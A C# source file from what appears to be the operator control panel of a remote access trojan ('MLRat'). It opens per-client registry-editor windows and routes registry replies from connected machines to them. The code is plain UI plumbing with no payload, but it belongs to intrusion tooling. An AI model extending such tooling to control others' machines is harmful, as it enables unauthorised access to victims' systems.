using MLManagementServer.Forms;
using MLRat.Server;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MLManagementServer.Handlers
{
    public static class RegistryEditorHandler
    {
        public static Dictionary<Guid, RegistryEditorForm> FormHandler = new Dictionary<Guid, RegistryEditorForm>();

        public static void Start(IClient c)
        {
            if(!FormHandler.ContainsKey(c.ID))
            {
                RegistryEditorForm form = new RegistryEditorForm(c);
                form.FormClosed += Form_FormClosed;
                form.Text = string.Format("Registry Edit ({0})", c.GetVariable<string>("Username", ""));
                FormHandler.Add(c.ID, form);
                form.Show();
            }
        }

        public static void ContextCallback(IClient[] clients)
        {
            foreach(IClient c in clients)
            {
                Start(c);
            }
        }

        public static void Disconnect(IClient c)
        {
            if(FormHandler.ContainsKey(c.ID))
            {
                FormHandler[c.ID].Close();
            }
        }

        public static void Handle(IClient c, object[] data)
        {
            RegistryCommand command = (RegistryCommand)data[1];

            Console.WriteLine("Registry Command: {0}", command.ToString());

            if (command == RegistryCommand.UpdateNodeResponce) UpdateNodes(c, (string[])data[2]);
            if (command == RegistryCommand.EmptyNode) EmptyNode(c);
            if (command == RegistryCommand.ValueResponce) UpdateValues(c, (Dictionary < string, string >)data[2]);
            if (command == RegistryCommand.NodeDeniedAccess) EmptyNode(c);
            if (command == RegistryCommand.ValueDeniedAccess) VauesDeniedAccess(c);
        }

        public static void UpdateNodes(IClient c, string[] nodes)
        {
            if(FormHandler.ContainsKey(c.ID))
            {
                FormHandler[c.ID].UpdateNode(nodes);
            }
        }

        public static void VauesDeniedAccess(IClient c)
        {
            if (FormHandler.ContainsKey(c.ID))
            {
                FormHandler[c.ID].ValueDeniedAccess();
            }
        }

        public static void UpdateValues(IClient c, Dictionary<string, string> values)
        {
            if (FormHandler.ContainsKey(c.ID))
            {
                FormHandler[c.ID].UpdateValues(values);
            }
        }

        public static void EmptyNode(IClient c)
        {
            if (FormHandler.ContainsKey(c.ID))
            {
                FormHandler[c.ID].UpdateEmptyNode();
            }
        }

        private static void Form_FormClosed(object sender, System.Windows.Forms.FormClosedEventArgs e)
        {
            RegistryEditorForm form = (RegistryEditorForm)sender;
            if(FormHandler.ContainsKey(form.Client.ID))
            {
                FormHandler.Remove(form.Client.ID);
            }
            form.Dispose();
        }
    }
}
